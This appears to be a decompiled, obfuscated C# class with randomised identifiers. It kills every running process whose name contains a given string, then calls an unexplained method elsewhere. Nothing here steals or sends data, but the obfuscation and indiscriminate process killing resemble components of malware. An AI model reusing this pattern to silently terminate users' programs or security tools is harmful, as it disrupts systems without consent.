using System;
using System.Diagnostics;

namespace CXUnSAPANzkE;

public sealed class WzdnptLMOOKmn
{
	public static bool mHCFOwQwpcYY(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void CFnTqMhEUlSK(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (mHCFOwQwpcYY(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					yIZYKSYRaZXoZvGddM.jDNtEuxKPmD();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
